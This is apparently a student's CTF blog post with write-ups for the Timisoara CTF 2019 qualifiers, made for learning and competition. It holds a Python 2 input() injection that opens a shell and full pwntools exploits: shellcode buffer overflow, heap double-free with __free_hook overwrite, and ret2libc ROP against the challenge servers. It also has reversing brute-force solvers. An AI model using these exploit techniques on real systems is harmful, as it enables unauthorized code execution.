---
title: "Timisoara CTF 2019 Qualifiers"
date: 2019-09-20
categories: CTF
--- 

An online international CTF competition for high-school students. I played with my regular teammates in **ItzyBitzySpider** under the name **acsii**. We managed to get 12th place, which originally meant we qualified for the onsite finals hosted in Timisoara, Romania, but the competition was cancelled in the end... :(

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/Timisoara CTF 2019 Qualification Round - Scoreboard.png)

# Writeups

## Hiss Hiss Python (pwn)

> This snake likes to h1ss at its input.  
> `nc 89.38.208.144 11113`

[Challenge Files](https://github.com/MiloTruck/CTF-Archive/tree/master/Timisoara%20CTF%202019%20Qualification%20Round/Binary%20Exploitation/Hiss%20Hiss%20Python%20%5B50%5D){: .btn .btn--primary}

**Solution**

Unlike Python 3, Python 2's input() actually evaluates the input instead of taking it as a string. If we feed a command into input(), Python 2 will run the command, which is the vulnerability.
Giving `__import__('os').system('/bin/sh')` as input opens a shell.

**Flag:** `TIMCTF{h1ss_h1ss_shell}`

## Swag (pwn)

> The server only lets hackers in, not script kiddies.  
> `nc 89.38.208.144 11111`

[Challenge Files](https://github.com/MiloTruck/CTF-Archive/tree/master/Timisoara%20CTF%202019%20Qualification%20Round/Binary%20Exploitation/Swag%20%5B100%5D){: .btn .btn--primary}

**Solution**

This is probably an unintended solution. Run `strings` on the binary and we get the following:
```
/lib64/ld-linux-x86-64.so.2
libc.so.6
gets
fflush
exit
srand
puts
time
printf
stdout
__libc_start_main
GLIBC_2.2.5
__gmon_start__
AWAVI
AUATL
[]A\A]A^A_
Enter your name: 
Hello, %s
, it appears you don't have enough swag
, I really like your swag. Come in!
Your access code is: TIMCTF{1_am_th3_c00kie_m0nsta}
```

**Flag:** `TIMCTF{1_am_th3_c00kie_m0nsta}`

## Bof-server (pwn)

> Today kids we learn how to write exploits for super-secure software: bof-server!  
> `nc 89.38.208.144 11112`  
> (non-standard flag format)

[Challenge Files](https://github.com/MiloTruck/CTF-Archive/tree/master/Timisoara%20CTF%202019%20Qualification%20Round/Binary%20Exploitation/Bof-server%20%5B100%5D){: .btn .btn--primary}

**Solution**

This is a standard buffer overflow shellcoding challenge. 

As usual, running `checksec` on the binary gives:
```   
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x400000)    
   RWX:      Has RWX segments
```

`checksec` shows the `NX Bit` as disabled, which means shellcode can be executed. After running the binary, we see the following output:  

`Hello! Here is the stack address: 7fffffffdc60, enter your name please:`  

The binary prints out the starting address of the stack, and asks for input. We can use `pwntools` to generate the shellcode to execute shell. The payload contains the following:

1. Shellcode
2. Padding (Overflow the stack until RIP)    
3. Stack address (To jump to our shellcode and execute shell)

Here's the final exploit:
```python
from pwn import *
from LibcSearcher import LibcSearcher
import sys

config = {
    "elf" : "./bof-server",
    #"libc" : "./",
    #"ld" : "./",
    "HOST" : "89.38.208.144",
    "PORT" : 11112,
}

def exploit(p):
    padding = "\x90"*264
    shellcode = asm(shellcraft.sh())

    ru("stack address: " )
    address = int("0x" + r(12), 16)

    payload = "\x90"*50 
    payload += shellcode
    payload += "\x90"*(264-50-len(shellcode))
    payload += p64(address)
    sla("please: ", payload)
    p.interactive()

if __name__ == "__main__":
    elf = context.binary = ELF(config["elf"])

    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    if sys.argv[-1] == "remote":
        p = remote(config["HOST"], config["PORT"])
    else:
        if "libc" in dir(): 
            p = process([config["ld"], config["elf"]], env={"LD_PRELOAD" : config["libc"]})
        else: 
            p = process(config["elf"])

        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    r = lambda a: p.recv(a)
    ru = lambda a: p.recvuntil(a)
    lg = lambda a : log.info(a)

    exploit(p)
```

**Flag:** `TIMCTF{oooverfl0w}wwwWWW`

## Team Manager (pwn)

> I found the team manager service used for Timisoara CTF. Do you think it is secure?  
> `nc 89.38.208.144 11114`

[Challenge Files](https://github.com/MiloTruck/CTF-Archive/tree/master/Timisoara%20CTF%202019%20Qualification%20Round/Binary%20Exploitation/Team%20Manager%20%5B300%5D){: .btn .btn--primary}

**Solution**

Running the binary instantly shows this is a standard heap challenge:
```
Welcome to the Timctf Team Manager
1: Add player
2: Remove player
3: Edit player
4: View player
5: View team
0: Exit
```

After analyzing the binary using Ghidra, a few observations can be made:
* Chunks on the heap can be freed multiple times without checks. There is a double free() vulnerability, which leaks an address pointing to the heap.
* Input is vulnerable to a heap overflow. By overflowing the "comments" section for one chunk, we can overwrite addresses on the following chunk.

The exploit follows the following order:

1. **Leak heap address**  
Leak the heap address using the double free() vulnerability. The address is stored in the "reversing and exploitation" and "crypto" areas in the heap. Viewing the team outputs the leaked heap address.

2. **Leak printf address**  
Using the heap overflow, overwrite the pointer to the "comments" section in the second chunk with the address of `printf` in the `GLOBAL OFFSET TABLE (GOT)`.Viewing the second player outputs the leaked `printf` address.

3. **Calculate libc base**  
Standard ret2libc procedure. Libc base can be calculated using `printf - printf_offset`, where `printf` is the leaked address and `printf_offset` is the address of `printf` in libc. With libc base value, the address of `__free_hook` and `system` can be calculated using `libc_base + system_offset` and `libc_base + __free_hook_offset` respectively.

4. **Overwrite __FREE_HOOK pointer with system**  
Overwrite the pointer to the "comments" section in the second chunk with the address of `__free_hook`. This makes the pointer point to the `__free_hook` instead. `__free_hook` can then be overwritten with the address of `system` by editing the "comments" of the second chunk. Calling free() now calls system() instead.

5. **Write /bin/sh into heap address**
Write the string `/bin/sh\x00` (*0x0068732f6e69622f* in hex) into the leaked heap address. The argument for free() is stored in this address when free() is called. When calling free() on first chunk, system(/bin/sh) is called instead, which executes a shell.

Here's the final exploit:
```python
from pwn import *
from LibcSearcher import LibcSearcher
import sys

config = {
    "elf" : "./timctf_manager",
    "libc" : "./libc-2.27.so",
    "ld" : "./ld-2.27.so",
    "HOST" : "89.38.208.144",
    "PORT" : 11114,
}

def add(pid, name, reversing, web, crypto, forensics, comment):
	sla("0: Exit", "1")
	sla("Enter player id (1-4) ", str(pid))
	sla("Player's name: ", name)
	sla("Player's skill at reversing and exploitation: ", str(reversing)) 
	sla("Player's skill at web exploit: ", str(web))
	sla("Player's skill at crypto: ", str(crypto))
	sla("Player's skill at forensics: ", str(forensics))
	sla("Extra note/comment: ", comment)

def remove(pid):
	sla("0: Exit", "2")
	sla("Enter player id (1-4) ", str(pid))

def edit(pid, name, reversing, web, crypto, forensics, comment):
	sla("0: Exit", "3")
	sla("Enter player id (1-4) ", str(pid))
	sla("Player's name: ", name)
	sla("Player's skill at reversing and exploitation: ", str(reversing)) 
	sla("Player's skill at web exploit: ", str(web))
	sla("Player's skill at crypto: ", str(crypto))
	sla("Player's skill at forensics: ", str(forensics))
	sla("Extra note/comment: ", comment)

def viewplayer(pid):
	sla("0: Exit", "4")
	sla("Enter player id (1-4) ", str(pid))

def viewteam():
	sla("0: Exit", "5")

def tohex(val, nbits):
  return hex((val + (1 << nbits)) % (1 << nbits))

def exploit(p):
	print_menu = 0x00400827
	printf_got = elf.got['printf']
	data  = elf.get_section_by_name(".data").header.sh_addr

	add(1, "", 1, 2, 3, 4, "")
	add(2, "", 1, 2, 3, 4, "")
	remove(1)
	remove(1)
	viewteam()

	ru('reversing and exploitation: ')
	lo = int(p.recvline().strip())
	lo = str(tohex(lo, 32))[2:]
	ru("crypto: ")
	hi = str(hex(int(p.recvline().strip())))
	leak = int(hi + lo, 16)

	payload = "\x90"*264 + p64(0x61) + p32(2)*4 + p64(printf_got)

	edit(1, "", 1, 1, 1, 1, payload)
	viewplayer(2)
	ru("Extra note/comment: ")

	printf = u64(r(8))
	base = printf - libc.symbols['printf']
	free_hook = base + libc.symbols['__free_hook']
	system = base + libc.symbols['system']
	
	payload = "\x90"*264 + p64(0x61) + p32(2)*4 + p64(free_hook)
	edit(1, "", 1, 1, 1, 1, payload)
	edit(2, "", 2, 2, 2, 2, p64(system))

	payload = "\x90"*264 + p64(0x61) + p32(2)*4 + p64(leak)
	edit(1, "", 1, 1, 1, 1, payload)
	edit(2, "", 2, 2, 2, 2, p64(0x0068732f6e69622f))
	remove(1)
	
	p.interactive()

if __name__ == "__main__":
    elf = context.binary = ELF(config["elf"])

    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    if sys.argv[-1] == "remote":
        p = remote(config["HOST"], config["PORT"])
    else:
        if "libc" in dir(): 
            p = process([config["ld"], config["elf"]], env={"LD_PRELOAD" : config["libc"]})
        else: 
            p = process(config["elf"])

        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    r = lambda a: p.recv(a)
    ru = lambda a: p.recvuntil(a)
    lg = lambda a : log.info(a)

    exploit(p)
```

**Flag:** `TIMCTF{Heap_overfl0ws_are_really_B4D}`

## Flag Manager Service (pwn)

> Our spies found this flag manager service running on the ctf server. It needs a password tho, but I am sure you can handle it.  
> `nc 89.38.208.144 11115`

[Challenge Files](https://github.com/MiloTruck/CTF-Archive/tree/master/Timisoara%20CTF%202019%20Qualification%20Round/Binary%20Exploitation/Flag%20Manager%20Service%20%5B400%5D){: .btn .btn--primary}

**Solution**

Analysis of the binary with Ghidra shows this is a standard ret2libc buffer overflow. `libc-2.27.so` being provided reinforces the challenge being a ret2libc.

As usual, all ret2libc exploits have the following order:
1. **Leak the address of puts**  
Leak the address of `puts` using `puts` to output the address. Essentially, just call `puts(puts_got)`, where `puts_got` is the address of `puts`in the `GLOBAL OFFSET TABLE (GOT)`.

2. **Calculate the libc base**  
Libc base can be calculated using `puts` - `puts_offset`, where `puts` is the leaked address and `puts_offset` is the address of `puts` in libc. 

3. **Calculate system and /bin/sh address**    
With libc base value, the address of `system` and the string `/bin/sh\x00` can be calculated using `libc_base + system_offset` and `libc_base + binsh_offset` respectively.

4. **Call system(/bin/sh)**  
Overflow the buffer and call `system(/bin/sh)`, which executes shell. Before calling `system(/bin/sh)`, the `RSI` register has to be set to 0, or the call will not work.

Here's the final exploit:
```python
from pwn import *
from LibcSearcher import LibcSearcher
import sys

config = {
    "elf" : "./flag_manager01",
    "libc" : "./libc-2.27.so",
    "ld" : "./ld-2.27.so",
    "HOST" : "89.38.208.144",
    "PORT" : 11115,
}

def exploit(p):
	padding = "\x90"*88
	main = elf.symbols['main']
	puts_got = elf.got['puts']
	puts_plt = elf.plt['puts']

	pop_rdi = elf.search(asm("pop rdi ; ret")).next()
	pop_rsi_r15 = elf.search(asm("pop rsi ; pop r15 ; ret")).next()

	payload = padding 
	payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
	sla("Enter your name: ", payload)
	sla("Enter password please: ", '') 

	p.recvline()
	p.recvline()

	puts = u64(p.recvline().strip() + '\x00'*2)
	base = puts - libc.symbols['puts']
	system = base + libc.symbols['system']
	sh = base + libc.search("/bin/sh\x00").next()

	payload = padding + p64(pop_rdi) + p64(sh) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(system)

	sla("Enter your name: ", payload)
	sla("Enter password please: ", '')
	 
	lg("SYSTEM: " + hex(system))
	lg("BASE: " + hex(base))
	p.interactive()

if __name__ == "__main__":
    elf = context.binary = ELF(config["elf"])

    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    if sys.argv[-1] == "remote":
        p = remote(config["HOST"], config["PORT"])
    else:
        if "libc" in dir(): 
            p = process([config["ld"], config["elf"]], env={"LD_PRELOAD" : config["libc"]})
        else: 
            p = process(config["elf"])

        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    r = lambda a: p.recv(a)
    ru = lambda a: p.recvuntil(a)
    lg = lambda a : log.info(a)

    exploit(p)
```

**Flag:** `TIMCTF{d3v_fd_i5_sn3aky_backd00r}`

## Pipes (reversing)

> The program seems to smoke a lot.

[Challenge Files](https://github.com/MiloTruck/CTF-Archive/tree/master/Timisoara%20CTF%202019%20Qualification%20Round/Reversing/Pipes%20%5B200%5D){: .btn .btn--primary}

**Solution**

As usual, first we decompile the binary using Ghidra for analysis. The code below are the important parts of the decompilation:

**rol** function:
```c
int rol(uchar *character,int max)

{
  int i;
  
  i = 0;
  while (i < max) {
    *character = *character * 2 | *character >> 7;
    i = i + 1;
  }
}
```
Part of the code in **main**:
```c
      character = character + 0x60;
      rol(&character,2);
      character = !(character ^ 0x7f);
      final = character * 0xed;
```

As the challenge name suggests, understanding of the C pipe() system call is required to solve this challenge. GeeksforGeeks explained and demonstrated the concept of pipes in C fairly well: [https://www.geeksforgeeks.org/c-program-demonstrate-fork-and-pipe/](https://www.geeksforgeeks.org/c-program-demonstrate-fork-and-pipe/)  

The challenge is quite simple. For every character in the input, it performs mathematical functions such as XOR, OR, NOT and basic arithmetic. It then checks if the final value is equal to the value stored.  

To obtain the flag, we can replicate the operations performed on each character in the flag. By brute-forcing every possible character for each position in the flag, we can find out which character matches the value stored in the binary, thus giving us the entire flag. 

Here's final code to solve the challenge:
```python
a = [0xb2, 0x35, 0x00, 0x00, 0x9a, 0xb3, 0x00, 0x00, 0xa6, 0x74, 0x00, 0x00, 0x1f, 0xad, 0x00, 0x00, 0xb6, 0xbe, 0x00, 0x00, 0xb6, 0xbe, 0x00, 0x00, 0x17, 0x88, 0x00, 0x00, 0xa6, 0x74, 0x00, 0x00, 0x7f, 0x8f, 0x00, 0x00, 0xd3, 0xb0, 0x00, 0x00, 0xef, 0xbb, 0x00, 0x00, 0xa6, 0x74, 0x00, 0x00, 0x87, 0xb4, 0x00, 0x00, 0x9b, 0x9a, 0x00, 0x00, 0x1a, 0x3d, 0x00, 0x00, 0xcb, 0x8b, 0x00, 0x00, 0xa6, 0x74, 0x00, 0x00, 0x9b, 0x9a, 0x00, 0x00, 0x7f, 0x8f, 0x00, 0x00, 0xa6, 0x74, 0x00, 0x00, 0x57, 0xc3, 0x00, 0x00, 0xe7, 0x96, 0x00, 0x00, 0xcb, 0x8b, 0x00, 0x00, 0xef, 0xbb, 0x00, 0x00, 0xcb, 0x8b, 0x00, 0x00, 0xa6, 0x74, 0x00, 0x00, 0x9b, 0x9a, 0x00, 0x00, 0xa3, 0xbf, 0x00, 0x00, 0xa6, 0x74, 0x00, 0x00, 0xb2, 0x35, 0x00, 0x00, 0x9a, 0xb3, 0x00, 0x00, 0xa6, 0x74, 0x00, 0x00, 0x87, 0xb4, 0x00, 0x00, 0x2e, 0x23, 0x00, 0x00, 0x87, 0xb4, 0x00, 0x00, 0x5e, 0x14, 0x00, 0x00, 0x73, 0xce, 0x00, 0x00, 0x5e, 0x14, 0x00, 0x00, 0xcb, 0x8b, 0x00, 0x00, 0xaa, 0x10, 0x00, 0x00]
final = []
flag = 'TIMCTF{'

for j in range(7, 0x2f):
    q = (j-7)*4
    final.append(a[q])


for val in final:
    for c in range(32, 127):
        test = c + 0x60
        for i in range(2):
            test = (test * 2) | (test >> 7)

        test ^= 0x7f
        test ^= 255
        test *= 0xed

        test = test & 0xff
        if test  == val:
            flag += chr(c)

flag += "}"
print flag

```

**Flag:** `TIMCTF{N0_n33d_for_piPe_if_there_is_N0_pIpEwEeD}`

## Strange Jump (reversing)

> This program likes to jump!

[Challenge Files](https://github.com/MiloTruck/CTF-Archive/tree/master/Timisoara%20CTF%202019%20Qualification%20Round/Reversing/Strange%20Jump%20%5B250%5D){: .btn .btn--primary}

**Solution**

Using Ghidra to decompile the binary, notice that there are a lot of functions. Most of the functions in the binary are placed to mislead and distract, and can be ignored. To find the function that contains the flag, look for the string `Yay, you got the flag!\n`.

Here's the simplified decompilation of the function:  
```c
alphabets = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

int e = 0;
int input_length = strlen(&input);
for (int a = 0; a < input_length; a += 3){
    int char_one = (&input)[a];
    int char_two = (&input)[a+1];
    int char_three = (&input)[a+2]
    
    bool check = false;
    for (int b = 0; b < 3; b++){
        if ((&input)[a+b] == "\0") check = true; 
    }
    
    for (int c = 3; c > -1; c--){
        int t = 0;
        for (int d = 5; d < -1; d--){
            if ((1 << (d+c*6 & 0x1f) & ((char_one << 8 | char_two) << 8 | char_three)) != 0){
                t = t | (1 << d & 0x1f);
            }
        }
        
        if (t == 0){
            if (check == true) ciphertext[e] == "A";
            else ciphertext[e] == "=";
        } else {
            ciphertext[e] == alphabets[t];
        }
        
        e += 1;
    }
}

int ciphertext_length = strlen(ciphertext);
int final_length = strlen(&final);
if (ciphertext_length == final_length){
    int a = 0;
    while (true){
        if (final[a] == "\0") puts("Yay! You got the flag!\n");
        if (final[a] != ciphertext[a]) break;
    }
}
```

The function is similar to the reversing challenge **Math**, but without a key. The flag can be obtained by replicating the function above and brute-forcing for the flag. This method tries every possible combination for every block of 3 characters in the flag, which can be done in reasonable time.

Here's the final code to solve the challenge:
```python

final = [86, 69, 108, 78, 81, 49, 82, 71, 101, 50, 82, 108, 81, 122, 78, 119, 100, 68, 70, 50, 90, 86, 57, 70, 101, 71, 78, 108, 85, 68, 66, 48, 97, 84, 66, 117, 88, 50, 103, 48, 98, 109, 82, 77, 90, 88, 74, 57]
alphabets = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_\{\}" 

print len(final)

flag = ''
count = 0
for trip in range(0,len(final),2):
    for fi in chars:
        for se in chars:
            for th in chars:
                a = ((ord(fi) << 8 | ord(se)) << 8 | ord(th))
                
                test = []

                for k in range(3,-1,-1):
                    t = 0
                    for m in range(5,-1,-1):
                        if (1 << (m+k*6 & 0x1f) & a != 0):
                            t = t | (1 << (m & 0x1f))
                    test.append(alphabets[t])

                if chr(final[count]) == test[0] and chr(final[count+ 1]) == test[1] and chr(final[count+2]) == test[2] and chr(final[count+3]) == test[3]:
                    print fi + se + th
                    flag += fi + se + th
                    break

    count += 2

print flag
```

**Flag:** `TIMCTF{deC3pt1ve_ExceP0ti0n_h4ndLer}`